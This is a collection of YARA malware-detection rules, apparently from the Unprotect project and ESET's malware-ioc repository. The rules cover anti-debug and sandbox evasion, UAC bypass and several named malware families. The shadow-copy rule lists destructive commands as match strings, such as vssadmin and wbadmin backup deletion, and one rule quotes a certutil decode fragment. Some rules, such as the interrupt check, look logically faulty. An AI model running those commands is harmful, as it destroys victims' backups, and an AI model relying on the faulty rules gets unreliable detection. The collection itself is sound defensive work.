rule Detect_EventLogTampering: AntiForensic {
    meta: 
        description = "Detect NtLoadDriver and other as anti-forensic"
        author = "Unprotect"
        comment = "Experimental rule"
    strings:
        $1 = "NtLoadDriver " fullword ascii
        $2 = "NdrClientCall2" fullword ascii
    condition:   
       uint16(0) == 0x5A4D and filesize < 1000KB and any of them 
}rule Detect_EventPairHandles: AntiDebug {
    meta: 
        description = "Detect EventPairHandlesas anti-debug"
        author = "Unprotect"
        comment = "Experimental rule"
    strings:
        $1 = "EventPairHandles" fullword ascii
        $2 = "RtlCreateQueryDebugBuffer" fullword ascii
        $3 = "RtlQueryProcessHeapInformation" fullword ascii
    condition:   
       uint16(0) == 0x5A4D and filesize < 1000KB and 2 of them 
}rule Detect_SuspendThread: AntiDebug {
    meta: 
        description = "Detect SuspendThread as anti-debug"
        author = "Unprotect"
        comment = "Experimental rule"
    strings:
        $1 = "UnhandledExcepFilter" fullword ascii
        $2 = "SetUnhandledExceptionFilter" fullword ascii
    condition:   
       uint16(0) == 0x5A4D and filesize < 1000KB and any of them 
}rule Detect_GuardPages: AntiDebug {
    meta: 
        description = "Detect Guard Pages as anti-debug"
        author = "Unprotect"
        comment = "Experimental rule"
    strings:
        $1 = "GetSystemInfo" fullword ascii
        $2 = "VirtualAlloc" fullword ascii
        $3 = "RtlFillMemory" fullword ascii
        $4 ="VirtualProtect" fullword ascii
        $5 ="VirtualFree" fullword ascii
    condition:   
       uint16(0) == 0x5A4D and filesize < 1000KB and 4 of them 
}rule AntiDebugging_Interrupt {
  condition:
    // Check for presence of __try and __except blocks
    uint32(0) == 0x00646120 and uint32(4) == 0x00646120 and
    // Check for presence of __debugbreak or interrupt instructions such as INT 3 or UD2
    (uint8(8) == 0xCC or uint8(8) == 0xF1 or uint8(8) == 0xCC)
} rule Detect_IsDebuggerPresent : AntiDebug {
    meta:
        author = "naxonez"
        reference = "https://github.com/naxonez/yaraRules/blob/master/AntiDebugging.yara"
    strings:
	$ ="IsDebugged"
    condition:
        uint16(0) == 0x5A4D and filesize < 1000KB and any of them
}rule Detect_LocalSize: AntiDebug {
    meta: 
        description = "Detect LocalSize as anti-debug"
        author = "Unprotect"
        comment = "Experimental rule"
    strings:
        $1 = "LocalSize" fullword ascii
    condition:   
       uint16(0) == 0x5A4D and filesize < 1000KB and $1
}rule Detect_NtQueryInformationProcess: AntiDebug {
    meta: 
        description = "Detect NtQueryInformationProcess as anti-debug"
        author = "Unprotect"
        comment = "Experimental rule"
    strings:
        $1 = "NtQueryInformationProcess" fullword ascii
    condition:   
       uint16(0) == 0x5A4D and filesize < 1000KB and $1
}rule Detect_NtQueryObject: AntiDebug {
    meta: 
        description = "Detect NtQueryObject as anti-debug"
        author = "Unprotect"
        comment = "Experimental rule"
    strings:
        $1 = "NtQueryObject" fullword ascii
    condition:   
       uint16(0) == 0x5A4D and filesize < 1000KB and $1
}rule Detect_NtSetInformationThread: AntiDebug {
    meta: 
        description = "Detect NtSetInformationThread as anti-debug"
        author = "Unprotect"
        comment = "Experimental rule"
    strings:
        $1 = "NtSetInformationThread" fullword ascii
    condition:   
       uint16(0) == 0x5A4D and filesize < 1000KB and $1
}import "pe"
 
rule UNPROTECT_Possible_GetForegroundWindow_Evasion
{
    meta:
        description = "Attempts to detect possible usage of sandbox evasion techniques using GetForegroundWindow API, based on module imports."
        author = "Kyle Cucci"
        date = "2020-09-30"
 
    condition:
        uint16(0) == 0x5A4D and
        pe.imports("user32.dll", "GetForegroundWindow") and
        pe.imports("kernel32.dll", "Sleep")
}rule Detect_RDTSC: AntiDebug AntiSandbox{
    meta: 
        description = "Detect RDTSC as anti-debug and anti-sandbox"
        author = "Unprotect"
        comment = "Experimental rule"
    strings:
        $1 = { 0F 31 }
    condition:   
       uint16(0) == 0x5A4D and filesize < 1000KB and $1
}rule Detect_SetDebugFilterState: AntiDebug {
    meta: 
        description = "Detect SetDebugFilterState as anti-debug"
        author = "Unprotect"
        comment = "Experimental rule"
    strings:
        $1 = "NtSetDebugFilterState" fullword ascii
        $2 = "DbgSetDebugFilterState" fullword ascii
    condition:   
       uint16(0) == 0x5A4D and filesize < 1000KB and any of them 
}rule YARA_Detect_ShortcutHiding
{
    meta:
        author = "Unprotect"
        status = "Experimental"
        description = "YARA rule for detecting Windows shortcuts with embedded malicious code"
    strings:
        $payload_start = "&(for %i in (*.lnk) do certutil -decode %i"
        $payload_end = "&start"
        $encoded_content = "BEGIN CERTIFICATE"
    condition:
        all of them
}rule SysmonEvasion
{
    strings:
        // Check for the LoadLibrary() function call
        $load_library = "LoadLibrary"

        // Check for the GetProcAddress() function call
        $get_proc_address = "GetProcAddress"

        // Check for the Unload() function call
        $unload = "Unload"

        // Check for the sysmondrv string
        $sysmondrv = "sysmondrv"

    condition:
        // Check if all the required strings are present in the code
        all of them
}rule detect_tlscallback {
    meta:
        description = "Simple rule to detect tls callback as anti-debug."
        author = "Thomas Roccia | @fr0gger_"
    strings:
        $str1 = "TLS_CALLBACK" nocase
        $str2 = "TLScallback" nocase
    condition:
        uint32(uint32(0x3C)) == 0x4550 and any of them
}rule xor_detection
{
    strings:
        $xor1 = { 31 d2 f7 e2 89 c2 }
        $xor2 = { 31 c9 f7 f9 99 c0 }
        $xor3 = { 31 f6 f7 e6 99 d0 }

    condition:
        any of them
}rule ModifyDLLExportName {
  strings:
    $map_and_load = "MapAndLoad"
    $entry_to_data = "ImageDirectoryEntryToData"
    $rva_to_va = "ImageRvaToVa"
    $modify = "ModifyDLLExportName"
    $virtual_protect = "VirtualProtect"
    $virtual_alloc = "VirtualAlloc"
  condition:
    all of them
}rule upx_antiunpack_pe {
     meta:
        description = "Anti-UPX Unpacking technique about section renaming and zero padding against upx reference structure"
        author = "hackeT"

    strings:
        $mz = "MZ"

        $upx0 = {55 50 58 30 00 00 00}  //section name UPX0
        $upx1 = {55 50 58 31 00 00 00}  //section name UPX1
        $upx_sig = "UPX!"               //UPX_MAGIC_LE32
        $upx_sig2 = {A1 D8 D0 D5}       //UPX_MAGIC2_LE32
        $zero = {00 00 00 00}

    condition:
        $mz at 0 and ( $upx_sig at 992 or $upx_sig2 at 992 )
        and 
        ( 
          not ($upx0 in (248..984) or $upx1 in (248..984)) // section renaming: 248 is the minimum offset after pe optional header.
        or 
          $zero in (992..1024)                             // zero padding against upx reference structure: pe header ends offset 1024.
        )
}rule Qemu_Detection
{
	meta:
		Author = "Thomas Roccia - @fr0gger_ - Unprotect Project"
		Description = "Checks for QEMU Registry Key"
	strings:
		$desc1 = "HARDWARE\\Description\\System" nocase wide ascii
		$desc2 = "SystemBiosVersion" nocase wide ascii
		$desc3 = "QEMU" wide nocase ascii

		$dev1 = "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0" nocase wide ascii
		$dev2 = "Identifier" nocase wide ascii
		$dev3 = "QEMU" wide nocase ascii
	condition:
		any of ($desc*) or any of ($dev*)
}rule shadow_copy_deletion {
    meta:
      description = "Detect shadow copy deletion"
      author = "ditekSHen/Unprotect"

    strings:
        $x1 = "cmd.exe /c \"vssadmin.exe Delete Shadows /all /quiet\"" fullword ascii
        $x2 = "C:\\Windows\\System32\\cmd.exe" fullword ascii
        $cmd1 = "cmd /c \"WMIC.exe shadowcopy delet\"" ascii wide nocase
        $cmd2 = "vssadmin.exe Delete Shadows /all" ascii wide nocase
        $cmd3 = "Delete Shadows /all" ascii wide nocase
        $cmd4 = "} recoveryenabled no" ascii wide nocase
        $cmd5 = "} bootstatuspolicy ignoreallfailures" ascii wide nocase
        $cmd6 = "wmic SHADOWCOPY DELETE" ascii wide nocase
        $cmd7 = "\\Microsoft\\Windows\\SystemRestore\\SR\" /disable" ascii wide nocase
        $cmd8 = "resize shadowstorage /for=c: /on=c: /maxsize=" ascii wide nocase
        $cmd9 = "shadowcopy where \"ID='%s'\" delete" ascii wide nocase
        $cmd10 = "wmic.exe SHADOWCOPY /nointeractive" ascii wide nocase
        $cmd11 = "WMIC.exe shadowcopy delete" ascii wide nocase
        $cmd12 = "Win32_Shadowcopy | ForEach-Object {$_.Delete();}" ascii wide nocase
        $delr = /del \/s \/f \/q(( [A-Za-z]:\\(\*\.|[Bb]ackup))(VHD|bac|bak|wbcat|bkf)?)+/ ascii wide
        $wp1 = "delete catalog -quiet" ascii wide nocase
        $wp2 = "wbadmin delete backup" ascii wide nocase
        $wp3 = "delete systemstatebackup" ascii wide nocase
      
    condition:
        (uint16(0) == 0x5a4d and 2 of ($cmd*) or (1 of ($cmd*) and 1 of ($wp*)) or #delr > 4) or (4 of them)
}import "pe"

rule Shamoon2_Wiper {
   meta:
      description = "Detects Shamoon 2.0 Wiper Component"
      author = "Florian Roth"
      reference = "https://goo.gl/jKIfGB"
      date = "2016-12-01"
      score = 70
      hash1 = "c7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a"
      hash2 = "128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd"
   strings:
      $a1 = "\\??\\%s\\System32\\%s.exe" fullword wide
      $x1 = "IWHBWWHVCIDBRAFUASIIWURRTWRTIBIVJDGWTRRREFDEAEBIAEBJGGCSVUHGVJUHADIEWAFGWADRUWDTJBHTSITDVVBCIDCWHRHVTDVCDESTHWSUAEHGTWTJWFIRTBRB" wide
      $s1 = "UFWYNYNTS" fullword wide
      $s2 = "\\\\?\\ElRawDisk" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them ) or ( 3 of them )
}

rule EldoS_RawDisk {
   meta:
      description = "EldoS Rawdisk Device Driver (Commercial raw disk access driver - used in Operation Shamoon 2.0)"
      author = "Florian Roth (with Binar.ly)"
      reference = "https://goo.gl/jKIfGB"
      date = "2016-12-01"
      score = 50
      hash1 = "47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34"
      hash2 = "394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b"
   strings:
      $s1 = "g\\system32\\" fullword wide
      $s2 = "ztvttw" fullword wide
      $s3 = "lwizvm" fullword ascii
      $s4 = "FEJIKC" fullword ascii
      $s5 = "INZQND" fullword ascii
      $s6 = "IUTLOM" fullword wide
      $s7 = "DKFKCK" fullword ascii

      $op1 = { 94 35 77 73 03 40 eb e9 }
      $op2 = { 80 7c 41 01 00 74 0a 3d }
      $op3 = { 74 0a 3d 00 94 35 77 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and 4 of them )
}rule UNPROTECT_UAC_Bypass_Strings {
    meta:
        description = "Rule to detect UAC bypass attempt by regarding strings"
        author = "Thibault Seret"
        date = "2020-04-10"
    strings:
        $s1 = "SeIncreaseQuotaPrivilege" ascii fullword
        $s2 = "SeSecurityPrivilege" ascii fullword
        $s3 = "SeTakeOwnershipPrivilege" ascii fullword
        $s4 = "SeLoadDriverPrivilege" ascii fullword
        $s5 = "SeSystemProfilePrivilege" ascii fullword
        $s6 = "SeSystemtimePrivilege" ascii fullword
        $s7 = "SeProfileSingleProcessPrivilege" ascii fullword
        $s8 = "SeIncreaseBasePriorityPrivilege" ascii fullword
        $s9 = "SeCreatePagefilePrivilege" ascii fullword
        $s10 = "SeBackupPrivilege" ascii fullword
        $s11 = "SeRestorePrivilege" ascii fullword
        $s12 = "SeShutdownPrivilege" ascii fullword
        $s13 = "SeDebugPrivilege" ascii fullword
        $s14 = "SeSystemEnvironmentPrivilege" ascii fullword
        $s15 = "SeChangeNotifyPrivilege" ascii fullword
        $s16 = "SeRemoteShutdownPrivilege" ascii fullword
        $s17 = "SeUndockPrivilege" ascii fullword
        $s18 = "SeManageVolumePrivilege" ascii fullword
        $s19 = "SeImpersonatePrivilege" ascii fullword
        $s20 = "SeCreateGlobalPrivilege" ascii fullword
        $s21 = "SeIncreaseWorkingSetPrivilege" ascii fullword
        $s22 = "SeTimeZonePrivilege" ascii fullword
        $s23 = "SeCreateSymbolicLinkPrivilege" ascii fullword
    condition:
        5 of them
}rule VBox_Detection
{
	meta:
		Author = "Thomas Roccia - @fr0gger_ - Unprotect Project"
		Description = "Checks for VBOX Registry Key"
	strings:
		$desc1 = "HARDWARE\\Description\\System" nocase wide ascii
		$desc2 = "SystemBiosVersion" nocase wide ascii
		$desc3 = "VideoBiosVersion" nocase wide ascii

		$data1 = "VBOX" nocase wide ascii
		$data2 = "VIRTUALBOX" nocase wide ascii
		
		$dev1 = "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0" nocase wide ascii
		$dev2 = "Identifier" nocase wide ascii
		$dev3 = "VBOX" nocase wide ascii

		$soft1 = "SOFTWARE\\Oracle\\VirtualBox Guest Additions"
		$soft2 = "HARDWARE\\ACPI\\DSDT\\VBOX__"
		$soft3 = "HARDWARE\\ACPI\\FADT\\VBOX__"
		$soft4 = "HARDWARE\\ACPI\\RSDT\\VBOX__"
		$soft5 = "SYSTEM\\ControlSet001\\Services\\VBoxGuest"
		$soft6 = "SYSTEM\\ControlSet001\\Services\\VBoxService"
		$soft7 = "SYSTEM\\ControlSet001\\Services\\VBoxMouse"
		$soft8 = "SYSTEM\\ControlSet001\\Services\\VBoxVideo"

		$virtualbox1 = "VBoxHook.dll" nocase
	        $virtualbox2 = "VBoxService" nocase
        	$virtualbox3 = "VBoxTray" nocase
        	$virtualbox4 = "VBoxMouse" nocase
        	$virtualbox5 = "VBoxGuest" nocase
        	$virtualbox6 = "VBoxSF" nocase
        	$virtualbox7 = "VBoxGuestAdditions" nocase
        	$virtualbox8 = "VBOX HARDDISK"  nocase
        	$virtualbox9 = "VBoxVideo" nocase
		$virtualbox10 = "vboxhook" nocase
		$virtualbox11 = "vboxmrxnp" nocase
		$virtualbox12 = "vboxogl" nocase
		$virtualbox13 = "vboxoglarrayspu" nocase
		$virtualbox14 = "vboxoglcrutil"
		$virtualbox15 = "vboxoglerrorspu" nocase
		$virtualbox16 = "vboxoglfeedbackspu" nocase
		$virtualbox17 = "vboxoglpackspu" nocase
		$virtualbox18 = "vboxoglpassthroughspu" nocase
		$virtualbox19 = "vboxcontrol" nocase

        	// VirtualBox Mac Address
        	$virtualbox_mac_1a = "08-00-27"
        	$virtualbox_mac_1b = "08:00:27"
        	$virtualbox_mac_1c = "080027"	
	condition:
		any of ($desc*) and 
		1 of ($data*) or 
		any of ($dev*) or 
		any of ($soft*) or
		any of ($virtualbox*)
}rule DebuggerCheck__RemoteAPI {
    meta:
        description = "Rule to RemoteAPI debugger check"
        author = "Thibault Seret"
        date = "2020-09-26"
    strings:
        $s1 ="CheckRemoteDebuggerPresent"
    condition:
        any of them
}// Animal Farm yara rules
// For feedback or questions contact us at: github@eset.com
// https://github.com/eset/malware-ioc/
//
// These yara rules are provided to the community under the two-clause BSD
// license as follows:
//
// Copyright (c) 2015, ESET
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
// 1. Redistributions of source code must retain the above copyright notice, this
// list of conditions and the following disclaimer.
//
// 2. Redistributions in binary form must reproduce the above copyright notice,
// this list of conditions and the following disclaimer in the documentation
// and/or other materials provided with the distribution.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
// FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
// DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
// OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
//

rule ramFS
{
    meta:
        Author      = "Joan Calvet"
        Date        = "2015/07/14"
        Description = "RamFS -- custom file system used by Animal Farm malware"
        Reference   = "http://www.welivesecurity.com/2015/06/30/dino-spying-malware-analyzed/"
        Source = "https://github.com/eset/malware-ioc/"
        Contact = "github@eset.com"
        License = "BSD 2-Clause"

    strings:
        $mz = { 4d 5a }

        // Debug strings in RamFS
        $s01 = "Check: Error in File_List"
        $s02 = "Check: Error in FreeFileHeader_List"
        $s03 = "CD-->[%s]"
        $s04 = "!!!EXTRACT ERROR!!!File Does Not Exists-->[%s]"
        // RamFS parameters stored in the configuration
        $s05 = "tr4qa589" fullword
        $s06 = "xT0rvwz" fullword

        // RamFS commands
        $c01 = "INSTALL" fullword
        $c02 = "EXTRACT" fullword
        $c03 = "DELETE" fullword
        $c04 = "EXEC" fullword
        $c05 = "INJECT" fullword
        $c06 = "SLEEP" fullword
        $c07 = "KILL" fullword
        $c08 = "AUTODEL" fullword
        $c09 = "CD" fullword
        $c10 = "MD" fullword        

    condition:
        ( $mz at 0 ) and
            ((1 of ($s*)) or (all of ($c*)))
}

rule dino
{
    meta:
        Author      = "Joan Calvet"
        Date        = "2015/07/14"
        Description = "Dino backdoor"
        Reference   = "http://www.welivesecurity.com/2015/06/30/dino-spying-malware-analyzed/"
        Source = "https://github.com/eset/malware-ioc/"
        Contact = "github@eset.com"
        License = "BSD 2-Clause"

    strings:
        $ = "PsmIsANiceM0du1eWith0SugarInsideA"
        $ = "destroyPSM"
        $ = "FM_PENDING_DOWN_%X"
        $ = "%s was canceled after %d try (reached MaxTry parameter)"
        $ = "you forgot value name"
        $ = "wakeup successfully scheduled in %d minutes"
        $ = "BD started at %s"
        $ = "decyphering failed on bd"

    condition:
        any of them
}// For feedback or questions contact us at: github@eset.com
// https://github.com/eset/malware-ioc/
//
// These yara rules are provided to the community under the two-clause BSD
// license as follows:
//
// Copyright (c) 2017, ESET
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
// 1. Redistributions of source code must retain the above copyright notice, this
// list of conditions and the following disclaimer.
//
// 2. Redistributions in binary form must reproduce the above copyright notice,
// this list of conditions and the following disclaimer in the documentation
// and/or other materials provided with the distribution.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
// FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
// DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
// OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
//
import "pe"

rule generic_carbon
{
  meta:
    author      = "ESET Research"
    date        = "2017-03-30"
    description = "Turla Carbon malware"
    reference   = "https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/"
    source = "https://github.com/eset/malware-ioc/"
    contact = "github@eset.com"
    license = "BSD 2-Clause"

  strings:
    $s1 = "ModStart"
    $t1 = "STOP|OK"
    $t2 = "STOP|KILL"

  condition:
    (uint16(0) == 0x5a4d) and (1 of ($s*)) and (1 of ($t*))
}

rule carbon_metadata
{
  meta:
    author      = "ESET Research"
    date        = "2017-03-30"
    description = "Turla Carbon malware"
    reference   = "https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/"
    source = "https://github.com/eset/malware-ioc/"
    contact = "github@eset.com"
    license = "BSD 2-Clause"

   condition:
      (pe.version_info["InternalName"] contains "SERVICE.EXE" or
       pe.version_info["InternalName"] contains "MSIMGHLP.DLL" or
       pe.version_info["InternalName"] contains "MSXIML.DLL")
       and pe.version_info["CompanyName"] contains "Microsoft Corporation"
}
// Keydnap packer yara rule
// https://github.com/eset/malware-ioc/
//
// These yara rules are provided to the community under the two-clause BSD
// license as follows:
//
// Copyright (c) 2016, ESET
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
// 1. Redistributions of source code must retain the above copyright notice, this
// list of conditions and the following disclaimer.
//
// 2. Redistributions in binary form must reproduce the above copyright notice,
// this list of conditions and the following disclaimer in the documentation
// and/or other materials provided with the distribution.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
// FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
// DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
// OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
//


rule keydnap_downloader
{
    meta:
        description = "OSX/Keydnap Downloader"
        author = "Marc-Etienne M.Léveillé"
        date = "2016-07-06"
        reference = "http://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-is-hungry-for-credentials"
        version = "1"

    strings:
        $ = "icloudsyncd"
        $ = "killall Terminal"
        $ = "open %s"
    
    condition:
        2 of them
}

rule keydnap_backdoor_packer
{
    meta:
        description = "OSX/Keydnap packed backdoor"
        author = "Marc-Etienne M.Léveillé"
        date = "2016-07-06"
        reference = "http://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-is-hungry-for-credentials"
        version = "1"

    strings:
        $upx_string = "This file is packed with the UPX"
        $packer_magic = "ASS7"
        $upx_magic = "UPX!"
        
    condition:
        $upx_string and $packer_magic and not $upx_magic
}

rule keydnap_backdoor
{
    meta:
        description = "Unpacked OSX/Keydnap backdoor"
        author = "Marc-Etienne M.Léveillé"
        date = "2016-07-06"
        reference = "http://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-is-hungry-for-credentials"
        version = "1"

    strings:
        $ = "api/osx/get_task"
        $ = "api/osx/cmd_executed"
        $ = "Loader-"
        $ = "u2RLhh+!LGd9p8!ZtuKcN"
        $ = "com.apple.iCloud.sync.daemon"
    condition:
        2 of them
}
// Linux/Moose yara rules
// For feedback or questions contact us at: github@eset.com
// https://github.com/eset/malware-ioc/
//
// These yara rules are provided to the community under the two-clause BSD
// license as follows:
//
// Copyright (c) 2015-2016, ESET
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
// 1. Redistributions of source code must retain the above copyright notice, this
// list of conditions and the following disclaimer.
//
// 2. Redistributions in binary form must reproduce the above copyright notice,
// this list of conditions and the following disclaimer in the documentation
// and/or other materials provided with the distribution.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
// FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
// DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
// OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
//
private rule is_elf
{
    strings:
        $header = { 7F 45 4C 46 }

    condition:
        $header at 0
}

rule moose_1
{
    meta:
        Author      = "Thomas Dupuy"
        Date        = "2015/04/21"
        Description = "Linux/Moose malware"
        Reference   = "http://www.welivesecurity.com/wp-content/uploads/2015/05/Dissecting-LinuxMoose.pdf"
        Source = "https://github.com/eset/malware-ioc/"
        Contact = "github@eset.com"
        License = "BSD 2-Clause"

    strings:
        $s0 = "Status: OK"
        $s1 = "--scrypt"
        $s2 = "stratum+tcp://"
        $s3 = "cmd.so"
        $s4 = "/Challenge"
        $s7 = "processor"
        $s9 = "cpu model"
        $s21 = "password is wrong"
        $s22 = "password:"
        $s23 = "uthentication failed"
        $s24 = "sh"
        $s25 = "ps"
        $s26 = "echo -n -e "
        $s27 = "chmod"
        $s28 = "elan2"
        $s29 = "elan3"
        $s30 = "chmod: not found"
        $s31 = "cat /proc/cpuinfo"
        $s32 = "/proc/%s/cmdline"
        $s33 = "kill %s"

    condition:
        is_elf and all of them
}

rule moose_2
{
    meta:
        Author      = "Thomas Dupuy"
        Date        = "2016/10/02"
        Description = "Linux/Moose malware active since September 2015"
        Reference   = "http://www.welivesecurity.com/2016/11/02/linuxmoose-still-breathing/"
        Contact = "github@eset.com"
        License = "BSD 2-Clause"

    strings:
        $s1 = "Modules are loaded"
        $s2 = "--scrypt"
        $s3 = "http://"
        $s4 = "https://"
        $s5 = "processor "
        $s6 = "cpu model "
        $s7 = "Host: www.challpok.cn"
        $s8 = "Cookie: PHPSESSID=%s; nhash=%s; chash=%s"
        $s9 = "fail!"
        $s10 = "H3lL0WoRlD"
        $s11 = "crondd"
        $s12 = "cat /proc/cpuinfo"
        $s13 = "Set-Cookie: PHPSESSID="
        $s14 = "Set-Cookie: LP="
        $s15 = "Set-Cookie: WL="
        $s16 = "Set-Cookie: CP="
        $s17 = "Loading modules..."
        $s18 = "-nobg"

    condition:
        is_elf and 5 of them
}
// Mumblehard packer yara rule
// https://github.com/eset/malware-ioc/
//
// These yara rules are provided to the community under the two-clause BSD
// license as follows:
//
// Copyright (c) 2015, ESET
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
// 1. Redistributions of source code must retain the above copyright notice, this
// list of conditions and the following disclaimer.
//
// 2. Redistributions in binary form must reproduce the above copyright notice,
// this list of conditions and the following disclaimer in the documentation
// and/or other materials provided with the distribution.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
// FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
// DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
// OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
//

rule mumblehard_packer
{
    meta:
        description = "Mumblehard i386 assembly code responsible for decrypting Perl code"
        author = "Marc-Etienne M.Léveillé"
        date = "2015-04-07"
        reference = "http://www.welivesecurity.com"
        version = "1"

    strings:
        $decrypt = { 31 db  [1-10]  ba ?? 00 00 00  [0-6]  (56 5f |  89 F7)
                     39 d3 75 13 81 fa ?? 00 00 00 75 02 31 d2 81 c2 ?? 00 00
                     00 31 db 43 ac 30 d8 aa 43 e2 e2 }
    condition:
        $decrypt
}// Operation Potao yara rules
// For feedback or questions contact us at: github@eset.com
// https://github.com/eset/malware-ioc/
//
// These yara rules are provided to the community under the two-clause BSD
// license as follows:
//
// Copyright (c) 2015, ESET
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
// 1. Redistributions of source code must retain the above copyright notice, this
// list of conditions and the following disclaimer.
//
// 2. Redistributions in binary form must reproduce the above copyright notice,
// this list of conditions and the following disclaimer in the documentation
// and/or other materials provided with the distribution.
//
